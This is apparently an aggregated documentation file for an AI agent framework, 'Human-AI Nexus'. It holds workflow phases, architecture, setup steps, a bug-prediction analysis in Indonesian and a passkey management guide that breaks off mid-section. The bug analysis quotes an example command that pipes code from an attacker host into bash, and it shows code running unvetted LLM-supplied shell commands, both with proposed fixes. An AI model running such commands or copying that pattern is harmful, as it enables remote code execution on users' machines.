## 📝 Penjelasan Detail Tiap Fase

### 🛠️ Phase 0: Inisialisasi (`INIT`)
*   **Aksi**: Sistem memetakan folder proyek, mendeteksi keberadaan folder `nexus/`, dan menyiapkan lingkungan eksekusi.
*   **Intel**: Memeriksa `package.json` untuk memastikan seluruh dependensi engine tersedia.

### 🔍 Phase 1: Audit (Scanning & Intelligence)
*   **Tujuan**: Mengidentifikasi celah keamanan, bug, atau potensi optimasi.
*   **Mode Kerja**:
    *   **Learning**: Memberikan edukasi kepada developer melalui laporan spesialis (Cyber, UX, SEO).
    *   **Efficient**: Fokus pada resolusi cepat dengan laporan tunggal dari PM.
*   **Guardrails**: Engine dilarang memindai file sensitif tanpa persetujuan eksplisit dari User.

### 📅 Phase 2: Planning (Strategi & Kontrak)
*   **Tujuan**: Menyusun *Implementation Plan* sebagai kontrak kerja AI.
*   **Logika**: Mengubah setiap temuan audit menjadi tugas (tasks) yang terukur.
*   **Output**: File `.md` di folder `documentation/planning/` yang harus ditinjau manusia.

### 🚀 Phase 3: Execution (Pengerjaan)
*   **Tujuan**: AI melakukan modifikasi kode atau pembuatan fitur.
*   **Aturan**: AI hanya diperbolehkan menjalankan perintah yang sesuai dengan *Implementation Plan* yang telah disetujui.

### 🔍 Phase 4: Verification (Quality Control)
*   **Tujuan**: Validasi hasil kerja.
*   **Mekanisme**: Membandingkan status proyek terbaru dengan target yang ditetapkan di Phase 1 & 2.
*   **Zero Flaws**: Jika ditemukan ketidaksesuaian, sistem akan memaksa siklus kembali ke Phase 1.

### 📝 Phase 5: Finalization & Records
*   **Tujuan**: Pencatatan sejarah dan pembaruan pengetahuan.
*   **Output**: 
    *   `memory/short_term/`: Log lengkap setiap siklus.
    *   `memory/long_term/`: Ringkasan pelajaran teknis untuk referensi di masa depan (The HUB).
    *   **🧠 Universal Nexus Collision Logic (Opsi A maupun Opsi B)**:
        *   Logika ini adalah standar baku yang diterapkan di seluruh pipeline **HUB (Knowledge)** dan **SKILL**.
        *   **Kondisi**: Terjadi saat ada kemiripan antara "A" (yang sudah ada) dan "B" (yang baru masuk/direfactor), baik itu berupa teori di HUB maupun instruksi teknis di SKILL.
        *   **Implementasi di HUB & SKILL**:
          Opsi A: { Standard_Pattern_A } 
          Opsi B: { Alternative_Pattern_B }
          (Opsi Tak Terbatas untuk variasi solusi)
        *   **Alur Refactoring Universal**:
            1.  **HUB Refactor**: Menggabungkan variasi dokumentasi fitur di folder `memory/long_term/`.
            2.  **SKILL Refactor**: Jika di folder `skill/` ditemukan teknik koding baru yang mirip dengan yang lama, keduanya disimpan sebagai **Pilihan Opsi (A/B/dst)** sebagai pilihan strategi bagi agen.
        *   **Tujuan**: Menjamin bahwa sistem tidak hanya memiliki satu cara kerja, melainkan sebuah **"Decision Tree"** dengan opsi tak terbatas yang kaya bagi AI untuk memilih solusi paling optimal (Context-Aware).

### 🌾 Phase 6: Harvesting (Cross-Project Knowledge)
*   **Tujuan**: Sinkronisasi pengetahuan lintas proyek.
*   **Aksi**: Mengumpulkan dokumentasi "Emas" dari proyek lain ke dalam `golden/` hub pusat.

---
*Dokumen ini merupakan bagian dari standar operasional Human-AI Nexus.*

---


### 📜 RULE: architecture.md
# System Architecture

The Human-AI Nexus is built as a modular orchestration system.

## Architecture Diagram

```mermaid
graph TD
    User([User/Human]) -- Approval --> PM[Project Manager Agent]
    User -- Initial Request --> Orc[Nexus Orchestrator]
    
    subgraph "Core Engine"
        Orc -- Trigger --> Audit[Audit Phase]
        Audit -- Results --> Plan[Planning Phase]
        Plan -- Tasks --> Exec[Execution Phase]
        Exec -- Success --> Record[Finalization Phase]
    end
    
    subgraph "Knowledge & Standards"
        Agent[(Agent Library)]
        Skill[(Skill/Standards)]
        Knowledge[(Knowledge Base)]
    end
    
    Audit -.-> Agent
    Plan -.-> Skill
    Record -.-> Knowledge
    
    Record -- Recursive --> Audit
```

## Components

### 1. Nexus Orchestrator (`NexusEngine.js`)
The central brain that coordinates the flow between phases. It ensures that data from the Audit phase is correctly passed to Planning, and that Execution only happens after approval.

### 2. Agent Layer
A collection of markdown files in `agent/` that define the persona, responsibilities, and guardrails for different AI agents (e.g., Architect, Engineer, QA).

### 3. Skill Layer
Technical standards and "best practice" snippets in `skill/` that guide the agents during the Execution phase.

### 4. Persistence Layer
Folders for `audit`, `planning`, `records`, and `knowledge` that ensure every step of the process is documented and persisted for long-term project memory.

---

## Ecosystem Integration

Nexus AI is designed to be highly portable and integrable with existing codebases.

- **External Pipeline**: The system intelligently detects and manages project-specific documentation and local AI "brains" inside the project root.
- **Deep Recaps**: Detailed documentation on how the engine interacts with external environments:
    - [Internal Pipeline Recap](NEXUS_INTERNAL_PIPELINE_RECAP.md)
    - [External Pipeline Recap](NEXUS_EXTERNAL_PIPELINE_RECAP.md)


---


### 📜 RULE: getting-started.md
# Getting Started with Human-AI Nexus

Human-AI Nexus is a framework designed to bridge the gap between human intent and AI execution through structured documentation and automated orchestration.

## Installation

### As a CLI tool
You can install the framework globally or run it via npx:

```bash
# Recommended if not published:
npx github:Faisal-Trainer/Human-AI-Nexus

# If published to npm:
npx @faisal-trainer/human-ai-nexus
```

### For Development
Clone the repository and install dependencies:

```bash
git clone https://github.com/Faisal-Trainer/Human-AI-Nexus.git
cd Human-AI-Nexus
npm install
```

## Basic Usage

To start a standard workflow cycle (Audit -> Plan -> Execute), run:
    
```bash
npx github:Faisal-Trainer/Human-AI-Nexus nexus run
```

*Note: You can also use `npm start` if you are working within the framework source directory.*

## Core Concepts

1.  **Documentation-First**: No code is written before a plan is approved.
2.  **Traceability**: Every action is linked to an audit finding and a plan.
3.  **Recursive Audit**: The cycle repeats until "Zero Flaws" are achieved.

## Project Structure

- `agent/`: Specialized role descriptions for AI agents.
- `audit/`: Generated audit reports.
- `documentation/planning/`: Implementation plans.
- `skill/`: Technical standards and snippets.
- `src/`: Core Nexus Engine source code.

---


### 📜 RULE: workflow.md
# Nexus Workflow

The Human-AI Nexus follows a 4-phase cyclical workflow designed to ensure maximum quality and traceability.

## 1. Audit Phase
The system (or specialized agents) scans the current state of the project.
- **Security Guardrails**: The engine will request explicit permission before scanning sensitive files (`.env`, `package.json`, `composer.json`).
- **Input**: Source code, documentation, and (if permitted) configuration files.
- **Output**: An Audit Report in `audit/`.
- **Goal**: Identify gaps, bugs, or opportunities for improvement.

## 2. Planning Phase
Based on the audit report, a detailed plan is generated.
- **Input**: Audit Report.
- **Output**: Implementation Plan in `documentation/planning/`.
- **Human Role**: Review and approve the plan.

## 3. Execution Phase
Specialized agents execute the tasks defined in the plan.
- **Input**: Approved Implementation Plan.
- **Action**: Code generation, configuration updates, or content creation.
- **Constraint**: Agents must follow the standards in `skill/`.

## 4. Finalization Phase
The results are recorded and the knowledge base is updated.
- **Input**: Execution results.
- **Output**: Logs in `memory/short_term/` and summaries in `documentation/summary/`.
- **Loop**: Trigger a new Audit to verify the changes.

---

### Zero Flaws Enforcement
The cycle repeats until an audit results in "Zero Flaws". This ensures that no technical debt or bugs are left behind.

---

## 🧠 DEEP WISDOM INJECTION (Phase 5 Institutionalization)
> Data ini adalah bagian dari memori inti agen yang diserap dari Knowledge Base.

### 📘 KNOWLEDGE: NEXUS_AI_NEXT_GEN_BUGS.MD

# NEXUS AI — Prediksi Bug Generasi Berikutnya
> **VERSION**: v1 | **Last Updated**: 26/05/2026


**Tipe Dokumen:** Predictive Failure Analysis  
**Basis:** Source code review mendalam — setelah seluruh bug generasi pertama diselesaikan  
**Metodologi:** Setiap bug diprediksi dari pola kode aktual, bukan spekulasi  

> **Konteks:** Dokumen ini menjawab pertanyaan: *"Setelah semua bug R-01 s/d R-08 selesai, bug apa yang akan muncul selanjutnya?"*  
> Semua temuan di sini berakar pada kode yang sudah ada — bukan fitur baru.

---

## Klasifikasi

| Kode | Severity | Kategori |
|------|----------|----------|
| G2-01 | 🔴 Kritis | Logic Bug |
| G2-02 | 🔴 Kritis | Security |
| G2-03 | 🔴 Kritis | Data Integrity |
| G2-04 | 🔴 Kritis | Concurrency |
| G2-05 | 🟡 Sedang | Logic Bug |
| G2-06 | 🟡 Sedang | Performance |
| G2-07 | 🟡 Sedang | Logic Bug |
| G2-08 | 🟡 Sedang | Data Integrity |
| G2-09 | 🟡 Sedang | Logic Bug |
| G2-10 | 🟢 Minor | Reliability |
| G2-11 | 🟢 Minor | Correctness |
| G2-12 | 🟢 Minor | Logic |

---

## 🔴 Bug Kritis

---

### G2-01 — `COMMAND_EXEC` di Modifier Adalah Arbitrary Code Execution
**File:** `agent/core/Modifier.js`, baris ~45  
**Kode aktual:**
```javascript
case 'COMMAND_EXEC':
    const { execSync } = require('child_process');
    execSync(action.command, { cwd: this.rootPath, stdio: 'ignore' });
    return true;
```

**Mengapa ini akan meledak setelah R-01 selesai:**  
Setelah `spawnRealLaravel()` diimplementasikan dan pipeline benar-benar berjalan, `COMMAND_EXEC` akan digunakan aktif — untuk `composer install`, `artisan migrate`, dan seterusnya. Masalahnya: `action.command` adalah string bebas yang datang dari hasil LLM (`blueprintApp` → `generate_architecture`). LLM bisa menghasilkan command apa saja.

**Skenario kegagalan konkret:**
- LLM menghasilkan blueprint dengan `"command": "rm -rf vendor && composer install"` → vendor terhapus
- LLM menghasilkan `"command": "curl http://attacker.com | bash"` jika prompt injection berhasil
- `execSync` bersifat **synchronous dan blocking** — satu command yang hang (misal `composer install` lambat) memblokir seluruh event loop Node.js

**Fix:**
```javascript
// 1. Ganti execSync dengan spawn async
// 2. Tambahkan whitelist command yang diizinkan
const ALLOWED_COMMANDS = ['composer', 'php', 'npm', 'node'];
const cmdParts = action.command.split(' ');
if (!ALLOWED_COMMANDS.includes(cmdParts[0])) {
    throw new Error(`COMMAND_EXEC: Command "${cmdParts[0]}" not in whitelist`);
}
// 3. Gunakan spawn, bukan execSync
await spawnAsync(cmdParts[0], cmdParts.slice(1), { cwd: this.rootPath });
```

---

### G2-02 — `blueprintApp()` Mem-parse JSON dari LLM Tanpa Validasi Schema
**File:** `agent/core/NexusEngine.js`, metode `blueprintApp()`  
**Kode aktual:**
```javascript
const jsonMatch = response.match(/\{[\s\S]*\}/);
const blueprint = JSON.parse(jsonMatch ? jsonMatch[0] : response);
await fs.writeJson(blueprintPath, blueprint, { spaces: 2 });
```

**Mengapa ini akan meledak:**  
Setelah pipeline berjalan end-to-end, `blueprint` menjadi sumber kebenaran untuk seluruh `ImplementationPhase` — menentukan model apa yang dibuat, migration apa yang dijalankan, dan Livewire component apa yang di-generate. LLM tidak selalu menghasilkan struktur yang persis sama.

**Skenario kegagalan konkret:**
- LLM menambahkan key tambahan: `"dependencies": ["laravel/telescope"]` → `ImplementationPhase` mengiterasi key yang tidak dikenal, tidak error, tapi menghasilkan file-file aneh
- LLM menghasilkan `"models": "User"` (string, bukan array) → `for (const model of models)` throw `TypeError: models is not iterable`
- LLM menambahkan instruksi dalam natural language di dalam JSON: `"models": ["User", "IMPORTANT: also add Admin model"]` → file bernama `IMPORTANT: also add Admin model.php` dibuat di filesystem

**Fix:**
```javascript
const BLUEPRINT_SCHEMA = {
    required: ['project_name', 'models', 'migrations', 'livewire_components'],
    arrays: ['models', 'migrations', 'livewire_components'],
    strings: ['project_name']
};

function validateBlueprint(bp) {
    for (const key of BLUEPRINT_SCHEMA.required) {
        if (!(key in bp)) throw new Error(`Blueprint missing required key: ${key}`);
    }
    for (const key of BLUEPRINT_SCHEMA.arrays) {
        if (!Array.isArray(bp[key])) throw new Error(`Blueprint key "${key}" must be array`);
        // Sanitize: hanya izinkan nama yang valid (alphanumeric + underscore)
        bp[key] = bp[key].filter(v => typeof v === 'string' && /^[a-zA-Z_][a-zA-Z0-9_]*$/.test(v));
    }
    return bp;
}
```

---

### G2-03 — `wrapAsConditional()` Menyebabkan Collision Accumulation yang Tidak Pernah Diselesaikan
**File:** `agent/core/NexusEngine.js`, metode `wrapAsConditional()`  
**File terkait:** `agent/core/phases/KnowledgePhase.js`, metode `harvest()`

**Kode aktual:**
```javascript
// NexusEngine.js
wrapAsConditional(existing, added, context = 'Nexus Knowledge') {
    return `\n# NEXUS COLLISION RESOLVED: ${context}\nOpsi A:\n${existing}\nOpsi B:\n${added}\n`;
}

// KnowledgePhase.js - saat harvest menemukan file yang sudah ada:
const merged = this.engine.wrapAsConditional(oldContent, newContent, `Collision in ${file}...`);
await fs.writeFile(targetPath, merged);
```

**Mengapa ini akan meledak setelah knowledge loop aktif:**  
Setiap kali sandbox ke-2, ke-3, ke-4 di-harvest dan menemukan file knowledge yang sudah ada, file itu di-wrap lagi. Tidak ada mekanisme yang menyelesaikan collision ini secara otomatis. Setelah 10 sandbox, satu file knowledge bisa berisi 10 level nesting `Opsi A / Opsi B`.

**Skenario kegagalan konkret:**
- `Distiller.simplifyContent()` mencoba meringkas file yang isinya adalah collision block bersarang → LLM menghasilkan ringkasan tidak koheren
- `getSemanticTags()` mencari regex `METADATA` tapi terhalang oleh collision headers → semantic index tidak dibangun
- File knowledge tumbuh eksponensial: 100 sandbox × rata-rata 5 collision = file berukuran puluhan MB

**Fix:** Tambahkan collision resolver otomatis di `MemoryPipeline.processHarvestData()` — gunakan `DecisionEngine` yang sudah ada untuk memilih versi terbaik, atau merge secara semantic, bukan hanya append.

---

### G2-04 — `ParallelRunner` Membuang Semua Hasil Jika Satu Worker Throw
**File:** `agent/core/ParallelRunner.js`  
**Kode aktual:**
```javascript
static async run(items, taskFn, limit = 3) {
    const results = new Array(items.length);
    let index = 0;
    
    const worker = async () => {
        while (index < items.length) {
            const currentIndex = index++;
            try {
                results[currentIndex] = await taskFn(items[currentIndex]);
            } catch (e) {
                results[currentIndex] = e;
                throw e;  // ← INI MASALAHNYA
            }
        }
    };

    const workers = [];
    for (let i = 0; i < Math.min(limit, items.length); i++) {
        workers.push(worker());
    }

    await Promise.all(workers);  // ← Jika satu throw, semua dibatalkan
    return results;
}
```

**Mengapa ini akan meledak:**  
`AuditPhase` memanggil `ParallelRunner.run(specialists, ...)` dengan 6 specialist. Jika specialist ke-3 (misal `database-architect`) throw error karena project tidak punya database files, `Promise.all` akan **reject seluruh batch**. Hasil dari specialist 1 dan 2 yang sudah selesai dengan sukses dibuang begitu saja.

**Skenario konkret:**  
Project baru yang di-audit tidak punya `database/` folder. `database-architect` scanner throw "No migration files found". Seluruh audit phase gagal. Laporan dari `cyber-security`, `ux-engineer`, dan `seo-performance` yang sudah selesai tidak pernah tersimpan.

**Fix:**
```javascript
} catch (e) {
    results[currentIndex] = { error: e.message, severity: 'SCANNER_ERROR' };
    // Jangan throw — catat error tapi lanjut ke item berikutnya
}
```

---

## 🟡 Bug Sedang

---

### G2-05 — `blueprintApp()` Hanya Berjalan Jika README Mengandung Magic String
**File:** `agent/core/NexusEngine.js`  
**Kode aktual:**
```javascript
async blueprintApp(options = {}) {
    const readmePath = path.join(this.rootPath, 'README.md');
    if (!(await fs.pathExists(readmePath))) return;
    const readmeContent = await fs.readFile(readmePath, 'utf8');
    if (!readmeContent.includes('Generated by Nexus Autonomous Pipeline')) return;
    // ...
}
```

**Masalah:**  
`blueprintApp` hanya berjalan jika README mengandung string `'Generated by Nexus Autonomous Pipeline'`. Sandbox yang dibuat oleh `spawnRealLaravel()` (setelah R-01 difix) menggunakan template Laravel default yang **tidak mengandung string ini**. Artinya `blueprintApp` selalu di-skip → tidak ada blueprint → `ImplementationPhase` selalu skip karena `NEXUS_BLUEPRINT.json` tidak ada.

**Dampak:** Seluruh code generation phase tidak pernah berjalan pada project baru yang di-spawn.

**Fix:** Buat `spawnRealLaravel()` menulis README dengan magic string tersebut, atau ubah kondisi menjadi opt-in yang lebih fleksibel:
```javascript
const isNexusManaged = readmeContent.includes('Generated by Nexus') || 
                       await fs.pathExists(path.join(this.rootPath, 'NEXUS_BLUEPRINT.json'));
if (!isNexusManaged) return;
```

---

### G2-06 — `MemoryGovernor.ensureDirectories()` Dipanggil Synchronous di Constructor
**File:** `agent/core/MemoryGovernor.js`  
**Kode aktual:**
```javascript
constructor(rootPath) {
    this.rootPath = rootPath;
    this.memoryPath = path.join(this.rootPath, 'memory');
    this.ensureDirectories(); // ← synchronous fs call di constructor
}

ensureDirectories() {
    const dirs = ['raw', 'normalized', 'semantic', 'distilled', ...];
    dirs.forEach(dir => {
        fs.ensureDirSync(path.join(this.memoryPath, dir)); // ← blocking I/O
    });
}
```

**Masalah:**  
`NexusEngine` membuat `new MemoryGovernor(rootPath)` di constructor-nya. Ini memicu 7 `fs.ensureDirSync` secara synchronous di startup. Pada sistem dengan I/O lambat (NFS mount, Docker volume, Windows dengan antivirus), ini bisa memblokir thread utama 100-500ms per direktori.

Setelah R-01 difix dan 100 sandbox berjalan, ini menjadi bottleneck nyata — setiap sandbox spawn membuat `NexusEngine` baru (atau me-reset root path), dan setiap reset memicu 7 blocking I/O calls lagi.

**Fix:** Ubah `ensureDirectories()` menjadi async dan panggil di `initRedis()` atau buat `static async create(rootPath)` factory method.

---

### G2-07 — `Machinist.integrate()` Memodifikasi `NexusEngine.js` dengan String Replacement Rapuh
**File:** `agent/core/Machinist.js`  
**Kode aktual:**
```javascript
async integrate(name, type = 'auditor') {
    let content = await fs.readFile(this.enginePath, 'utf8');
    
    const requireAnchor = "const Distiller = require('./Distiller');";
    content = content.replace(
        requireAnchor,
        `${requireAnchor}\nconst ${name} = require('${relPath}');`
    );

    const initAnchor = "this.distiller = new Distiller(this.knowledgePath);";
    content = content.replace(
        initAnchor,
        `${initAnchor}\n        this.${instanceName} = new ${name}(this.rootPath);`
    );

    await fs.writeFile(this.enginePath, content);
}
```

**Masalah:**  
`Machinist.integrate()` memodifikasi source code `NexusEngine.js` hidup-hidup dengan mencari string literal `"const Distiller = require('./Distiller');"` sebagai anchor point. Ini akan gagal jika:
1. Developer menambahkan komentar setelah baris tersebut
2. Format file berubah (prettier/eslint auto-format mengubah spasi/quotes)
3. `integrate()` dipanggil dua kali untuk komponen berbeda → anchor pertama mungkin sudah berubah karena inject pertama

Setelah pipeline aktif dan Machinist mulai di-invoke untuk forging scanner baru, setiap call ke `integrate()` yang gagal meninggalkan `NexusEngine.js` dalam kondisi parsial-corrupt (anchor diganti tapi tidak semua inject berhasil).

**Fix:** Gunakan AST parser (seperti `@babel/parser` atau `acorn`) untuk modifikasi kode, bukan string replacement. Atau gunakan sentinel comment yang lebih robust: `// NEXUS_INJECT_REQUIRE` dan `// NEXUS_INJECT_INIT`.

---

### G2-08 — `MemoryPipeline.processHarvestData()` Menghapus Folder Harvest Setelah Proses
**File:** `agent/core/MemoryPipeline.js`  
**Kode aktual:**
```javascript
async processHarvestData() {
    // ... proses file harvest ...
    
    await fs.emptyDir(harvestPath);  // ← Hapus semua setelah proses
    console.log('   🧹 Harvest folder recycled.');
}
```

**Masalah:**  
`golden/harvest/` dikosongkan setelah setiap `processHarvestData()`. Jika proses di tengah-tengah crash (misalnya `versionedWrite()` gagal karena disk penuh), beberapa file sudah diproses dan dihapus dari harvest, tapi belum semua masuk ke HUB. Tidak ada cara untuk replay atau recovery. Data dari sandbox yang sudah di-destroy hilang permanen.

**Fix:** Gunakan move-then-delete, bukan copy-then-delete. Atau tambahkan transaction log: catat file yang sudah berhasil di-ingest sebelum `emptyDir`.

```javascript
const processedLog = path.join(harvestPath, '.processed.json');
const processed = [];
for (const file of files) {
    await this.versionedWrite(dest, content);
    processed.push(file);
    await fs.writeJson(processedLog, processed); // checkpoint
}
// Hanya hapus setelah semua berhasil tercatat
await fs.emptyDir(harvestPath);
```

---

### G2-09 — `Modifier.fileReplace()` Throw Jika Target Content Tidak Ditemukan (Tidak Di-handle)
**File:** `agent/core/Modifier.js`  
**Kode aktual:**
```javascript
async fileReplace(filePath, targetContent, replacementContent) {
    if (await fs.pathExists(filePath)) {
        let content = await fs.readFile(filePath, 'utf8');
        if (content.includes(targetContent)) {
            const newContent = content.replace(targetContent, replacementContent);
            await fs.writeFile(filePath, newContent);
            return true;
        }
        throw new Error(`Target content not found in file: ${filePath}`); // ← throw tanpa context
    }
    throw new Error(`File not found: ${filePath}`);
}
```

**Masalah:**  
`FILE_REPLACE` action dari `PlanningPhase` menggunakan content yang dihasilkan LLM sebagai `targetContent`. LLM mungkin menghasilkan konten yang sedikit berbeda dari file aktual (whitespace, newline, encoding). Akibatnya `fileReplace` selalu throw pada iterasi kedua ke atas karena file sudah dimodifikasi oleh iterasi pertama.

Di `ExecutionPhase`, error ini hanya di-catch dan dicatat sebagai `task.status = 'failed'` — lalu `continue` ke task berikutnya. Tidak ada rollback. Setelah 10 task, mungkin 6 berhasil dan 4 gagal diam-diam.

**Dampak nyata:** Developer melihat "✅ Execution phase completed" tapi setengah task tidak benar-benar dieksekusi.

**Fix:** `FILE_REPLACE` harus menjadi `FILE_PATCH` yang menggunakan diff/patch semantics, bukan exact string match. Atau tambahkan fuzzy matching dengan normalisasi whitespace sebelum cek `includes()`.

---

## 🟢 Bug Minor

---

### G2-10 — `LocalIntelligence` Circuit Breaker Tidak Pernah Kembali ke CLOSED
**File:** `agent/core/LocalIntelligence.js`  
**Kondisi:** Saat `failures >= threshold`, state berubah ke `OPEN`. Setelah `HALF_OPEN`, jika satu request berhasil, seharusnya kembali ke `CLOSED`. Jika implementasi HALF_OPEN tidak ada (atau hanya state label tanpa logika), circuit breaker hanya bisa OPEN permanen untuk satu session.

**Dampak:** Jika Ollama sempat timeout sekali di awal session, seluruh code generation diblokir untuk sisa session itu meskipun Ollama sudah kembali normal.

---

### G2-11 — `ensureEnv()` di Modifier Menggunakan Path yang Salah
**File:** `agent/core/Modifier.js`  
**Kode aktual:**
```javascript
async ensureEnv(filePath, key, value) {
    const envFile = path.resolve(this.rootPath, '.env');
    // ↑ Parameter `filePath` diabaikan sepenuhnya — selalu pakai rootPath/.env
```

**Masalah:** `action.target` dari task yang memanggil `ENV_ENSURE` sepenuhnya diabaikan. Jika task dimaksudkan untuk memodifikasi `.env` di dalam sandbox (bukan di rootPath), perubahan malah ditulis ke `.env` NEXUS engine itu sendiri.

---

### G2-12 — `getSemanticTags()` Regex Hanya Menangkap Satu Tag Block Per File
**File:** `agent/core/NexusEngine.js`  
**Kode aktual:**
```javascript
const match = content.match(/>\\s*\\*\\*METADATA.*\\*\\*:\\s*\\[(.*)\\]/i);
if (match) return match[1].split(',').map(t => t.trim().toLowerCase());
```

**Masalah:** `String.match()` tanpa flag `g` hanya menangkap kemunculan pertama. Setelah collision wrapping terjadi berulang kali (lihat G2-03), satu file bisa punya beberapa `METADATA` block. Hanya block pertama yang terbaca. Semantic index tidak lengkap.

---

## Ringkasan: Urutan Munculnya Bug

Setelah bug generasi pertama diselesaikan, urutan bug berikut yang paling mungkin muncul pertama kali berdasarkan jalur eksekusi:

```
nexus run (pertama kali setelah fix)
    │
    ├─ blueprintApp() ──────────────── [G2-05] magic string → blueprint tidak dibuat
    │
    ├─ AuditPhase (6 specialists)
    │   └─ ParallelRunner ───────────── [G2-04] satu scanner error → semua dibatalkan
    │
    ├─ ImplementationPhase
    │   └─ blueprintApp() skip
    │       └─ LLM generate JSON ──── [G2-02] schema tidak valid → TypeError di loop
    │
    ├─ ExecutionPhase
    │   └─ COMMAND_EXEC ─────────────── [G2-01] blocking execSync, no whitelist
    │   └─ FILE_REPLACE ─────────────── [G2-09] target content tidak ditemukan
    │
    └─ KnowledgePhase (harvest ke-2 dst)
        └─ collision ─────────────────── [G2-03] wrapAsConditional bertumpuk
        └─ emptyDir crash ───────────── [G2-08] data hilang tanpa recovery
```

**Bug yang paling berbahaya untuk diselesaikan lebih dulu (sebelum G2-01):** G2-04, karena ia menyembunyikan semua bug lain — jika satu scanner gagal, kamu tidak akan pernah tahu scanner mana yang berhasil dan mana yang tidak.

---

*Analisis ini berdasarkan pembacaan langsung file: `Modifier.js`, `NexusEngine.js` (blueprintApp, wrapAsConditional), `ParallelRunner.js`, `MemoryPipeline.js`, `KnowledgePhase.js`, `Machinist.js` (integrate), `LocalIntelligence.js`, `MemoryGovernor.js`.*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_PASSKEY-MANAGEMENT.MD

# Passkey Management Guide
> **VERSION**: v1 | **Last Updated**: 26/05/2026



This guide details how to enable users to view, rename, and delete their registered passkeys while keeping saved credentials perfectly synchronized between the server and the user's password managers using the Signal API.

## Server-Side Operations

Your backend database layer and endpoints MUST support common CRUD actions for registered credentials. Decoupled from framework-specific libraries, the server exposes endpoints to:

1.  **List all user credentials**: Fetch all `StoredPasskeyCredential` records matching the signed-in user's ID.
2.  **Update credential names**: Accept a new custom string name for a specific credential ID and persist the update.
3.  **Delete credentials**: Remove a specific credential ID from the database.

```javascript
// Node.js routing example for credential CRUD
router.get('/api/credentials', checkUserAuthenticated, async (req, res) => {
  const list = await db.findCredentialsByUserId(req.user.id);
  return res.json(list);
});

router.put('/api/credential/:id', checkUserAuthenticated, async (req, res) => {
  const { id } = req.params;
  const { name } = req.body;
  const cred = await db.findCredentialById(id);
  if (!cred || cred.passkeyUserId !== req.user.id) {
    return res.status(404).json({ error: 'Credential not found.' });
  }
  cred.name = name;
  await db.saveCredential(cred);
  return res.json(cred);
});

router.delete('/api/credential/:id', checkUserAuthenticated, async (req, res) => {
  const { id } = req.params;
  const cred = await db.findCredentialById(id);
  if (!cred || cred.passkeyUserId !== req.user.id) {
    return res.status(404).json({ error: 'Credential not found.' });
  }
  await db.deleteCredential(id);
  return res.json({ success: true });
});
```

## Client-Side Management UI

Render a dedicated settings panel allowing users to easily audit and manage their registered authentication options:

1.  **Display saved list**: Fetch list from your endpoint and render individual credential rows. If the response is empty, render a helpful empty-state message (e.g., "No passkeys found").
2.  **Map AAGUID Metadata**: For each passkey, lookup its `aaguid` property against your local registry to render its provider details. See [Determine the passkey provider from AAGUID](#aaguid) section for more details.
3.  **Per-Item UI Requirements**: Every row inside the list container MUST render:
    *   **Provider Icon**: AAGUID-derived image or data URI.
    *   **Provider/Custom Name**: AAGUID-derived name or user-renamed string.
    *   **Registration Date**: The database-persisted raw epoch timestamp `registeredAt` formatted to a human-readable date for client display.
    *   **Last Used Date**: The database-persisted raw epoch timestamp `lastUsedAt` formatted to a human-readable date (if present) for client display.
    *   **Rename Button**: Triggers a rename text input modal.
    *   **Delete Button**: Triggers deletion.
4.  **Conditional "Create Passkey" Button**:
    *  Offer a prominent "Create passkey" registration trigger button on the management page. Before rendering this UI element, the page MUST feature-detect capabilities using `PublicKeyCredential.getClientCapabilities()` to verify platform authenticator is supported. If passkeys are unsupported, hide this button and gracefully encourage standard MFA enrollments instead.
    *  Allow registering a security key by omitting `authenticatorSelection.authenticatorAttachment` on `navigator.credentials.create()` call.

## Signal API Synchronization

The Signal API lets the application communicate credential states to password managers, keeping the user's synced vaults and your backend database in lockstep.

*   **Parameter Encoding Rule**:
    *  All `userId` and credential ID parameters passed to Signal API methods (`signalAllAcceptedCredentials`, `signalCurrentUserDetails`) MUST be **Base64URL-encoded strings**.
*   **Initiating Page Load Sync**:
    *  The application MUST invoke `signalAllAcceptedCredentials()` automatically in a `DOMContentLoaded` page load event listener.
*   **Management Updates Sync**:
    *  The application MUST invoke `signalAllAcceptedCredentials()` immediately within your delete credential click handler post-fetch.
    *  The application MUST invoke `signalCurrentUserDetails()` immediately within your username or display name rename click handler post-fetch.

```javascript
// Client-side management synchronization ES module
import { listFetch, renameFetch, deleteFetch } from './api.js';

// Base64URL-encoded User ID string (illustration only)
const base64UrlUserId = "M2YPl-KGnA8";

async function syncAcceptedCredentials(currentCredentialsList) {
  try {
    const credentialIds = currentCredentialsList.map(c => c.id); // Map of Base64URL credential ID strings
    
    await PublicKeyCredential.signalAllAcceptedCredentials({
      rpId, // RP ID must match the one defined on the server
      userId: base64UrlUserId, // User ID Base64URL-encoded string
      allAcceptedCredentialIds: credentialIds
    });
  } catch (e) {
    console.error('SignalAllAcceptedCredentials sync failure:', e);
  }
}

async function loadManagementPanel() {
  const response = await listFetch();
  const list = await response.json();
  
  renderUI(list);
  // Sync on page load
  await syncAcceptedCredentials(list);
}

async function performDelete(credentialId) {
  const response = await deleteFetch(credentialId);
  if (response.ok) {
    const updatedResponse = await listFetch();
    const updatedList = await updatedResponse.json();
    
    renderUI(updatedList);
    // Sync after deletion
    await syncAcceptedCredentials(updatedList);
  }
}

async function performRename(rpId, userId, updatedName, updatedDisplayName) {
  const response = await renameFetch({ name: updatedName, displayName: updatedDisplayName });
  if (response.ok) {
    try {
      await PublicKeyCredential.signalCurrentUserDetails({
        rpId, // RP ID must match the one defined on the server
        userId, // Base64URL-encoded user ID
        name: updatedName, // Updated username
        displayName: updatedDisplayName // Updated display name
      });
    } catch (e) {
      console.error('SignalCurrentUserDetails sync failure:', e);
    }
  }
}
```

## Determine the passkey provider from AAGUID {: #aaguid }

An AAGUID (Authenticator Attestation Globally Unique Identifier) is a 128-bit identifier that represents the model of the authenticator, not a specific instance. It is included in the authenticator data during passkey registration and can be used to determine which passkey provider (e.g. Google Password Manager, iCloud Keychain, 1Password) created a credential.

AAGUID should only be used to help users with passkey management. It can be modified unless cryptographically attested, which platform passkeys currently don't support.

### 1. AAGUID Registry

A community-maintained JSON mapping of AAGUIDs to provider names and icons is available at:

```
https://raw.githubusercontent.com/passkeydeveloper/passkey-authenticator-aaguids/refs/heads/main/combined_aaguid.json
```

Each entry has the following schema:

```json
{
  "<aaguid-uuid>": {
    "name": "Provider Name",
    "icon_light": "data:image/png;base64,...",
    "icon_dark": "data:image/png;base64,..."
  }
}
```

### 2. Using AAGUID After Registration

After verifying a registration response, read the `aaguid` from the registration result and look it up against the registry to populate the credential's `name` and `providerIcon`:

